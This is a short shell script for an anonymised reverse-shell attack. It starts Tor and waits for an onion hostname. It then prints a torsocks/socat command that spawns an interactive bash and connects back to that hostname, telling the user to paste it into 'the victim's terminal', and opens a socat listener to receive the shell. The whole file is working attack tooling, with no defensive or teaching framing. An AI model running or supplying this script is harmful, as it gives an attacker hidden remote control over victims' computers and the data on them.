#!/bin/sh

tor &

if [ ! -f /var/lib/tor/hidden_service/hostname ]; then

    while [ ! -f /var/lib/tor/hidden_service/hostname ]; do
        sleep 30
    done
fi

LPORT=80
LHOST=$(cat /var/lib/tor/hidden_service/hostname)
RSHELL="torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"

echo "\n\nPaste the command in the victim's terminal:\n\n$RSHELL\n\n"

socat file:$(tty),raw,echo=0 TCP-L:$LPORT
